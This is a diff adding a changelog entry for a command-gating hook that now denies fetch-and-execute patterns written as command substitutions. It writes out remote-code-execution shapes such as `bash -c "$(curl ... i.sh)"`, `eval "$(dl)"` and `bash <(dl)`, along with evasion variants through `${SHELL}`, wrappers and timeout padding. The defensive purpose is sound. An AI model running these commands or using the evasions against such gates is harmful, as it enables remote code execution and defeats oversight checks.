@@ -1,5 +1,69 @@
 # Changelog — Bootstrap Protocol implementation
 
+## Unreleased — X-37 / item 1b: Class B closed, the download-then-run substitution channel (2026-08-14)
+
+**PATCH-shaped but security-relevant: a live remote-code-execution channel that
+was `allow`/`allow` on both substrates is now `deny`/`deny` on both.**
+
+`bash -c "$(curl -sSL http://host/i.sh)"` is `curl | bash` with the pipe spelled
+as a command substitution. Item 1 (2.7.4) closed **Class A** — a read or install
+at a command position *inside* a double-quoted substitution — but it could not
+close **Class B**, where the substitution's fetched OUTPUT is what gets
+executed: the item-1 walk exposes the inner `curl`, and a bare download is
+allowed by design, so no command position denied. The D20 download-then-run
+correlation could not reach it either, because this channel is **fileless** and
+D20 pairs a written path with a later run of that same path.
+
+**The rule.** `cmdpos.subst_to_shell_regex` models a substituted DOWNLOADER whose
+value lands at an EXECUTION position — `dl | executor` without the pipe — and it
+sits **beside `pipe_to_shell_regex`**, which is where backlog X-37 asked for it.
+One source, rendered into both substrates (`_SUBRUN_RE` in the emitted shell
+gate, `_SUBST_TO_SHELL` in the emitted `gates.py`), evaluated on the **same five
+normalized strings the pipe trigger already computes** — no sixth normalization.
+Four execution positions: `eval "$(dl)"`; a code flag whose value is the fetched
+text (`bash -c`, `python3 -c`, `perl -e`, and any bundle containing the letter,
+so `-cx` and `-xc` both count); a bare `$(dl)`/backtick at a command position;
+and the stdin channels `bash <(dl)`, `bash < <(dl)`, `bash <<< "$(dl)"`.
+
+**The executor slot is `interpreter_word`, not a word list.** Its second arm is
+an UNMODELLABLE command word, so `${SHELL} -c "$(curl url)"` is covered by the
+same encoding that covers `bash` — building this from `INVOKERS` would have
+shipped a rule that denies `bash -c "$(dl)"` and waves `${SHELL} -c "$(dl)"`
+through, which is the evasion the pipe rule already repaired once.
+
+**53 differential rows go allow/allow → deny/deny, and every one was MEASURED
+allow/allow before it was written into the corpus.** The 19-row false-positive
+fence is unchanged: `x=$(dl)`, `echo "$(dl)"`, `bash -c "echo hi" "$(dl)"`,
+`source "$(dl)"` (the output is a FILENAME, not code — which is why
+`source <(dl)` denies and this does not), `arr=($(dl))`, `(( $(dl) ))`,
+`jq . <(dl)` and the HTTP-status idiom all still allow.
+
+**ONE OVER-REFUSAL SHIPS DELIBERATELY AND IS DISCLOSED.** `sudo echo "$(dl)"`
+and `timeout 5 grep "$(dl)" f` now deny. Telling a wrapper's flag VALUE from its
+command WORD is arity modelling, which `lib/cmdpos.py` refuses three times over,
+and the flags-only alternative was **measured** to cost `timeout 5 $(dl)`,
+`nice -n 5 $(dl)`, `sudo -u root $(dl)` and `watch -n 1 $(dl)` — every one of
+them a live RCE. Over-refusal is the direction that file calls "the only
+acceptable one here", and both directions are pinned in the differential.
+
+**Cost, because the first spelling was itself a fail-open.** Unanchored, the
+rule cost **3.97 s on an 8 KB command** — `_cost_guard` admits 81920 bytes, so
+the emitted 60 s timeout was reachable with padding alone, and X-51 measured
+what a crossing does: the hook is killed, a killed hook never exits 2, and the
+command runs. Anchoring every arm at a command position (which is also the
+correct semantics) took it to **42 ms at the 80 KB ceiling**.
+
+Freeze exception **71**: two emitted bodies move (`dependency-gate.sh`,
+`sdk_gates/gates.py`; retrofit moves only the former, as it emits no
+`gates.py`), derived by rendering both trees and diffing artifact by artifact.
+Artifact set identical, 0 added, 0 dropped; **action counts unchanged** —
+greenfield 57/69/59, retrofit 79/93. Suite **25 / 9,739 / 0**; differential
+**4,163**.
+
+**What this does NOT do.** It does not move the production-readiness verdict.
+It closes one named instance of that verdict's security leg; X-52, X-54 and
+X-55 remain open and C-2 is untouched. `main` is still **not production ready**.
+
 ## 2.7.4 → 2.8.0 — the LIT literature fold: nine additive items, one priming change (2026-08-14)
 
 **MINOR — it qualifies on both counts, the v2.7.0 shape.** Adopts all ten items
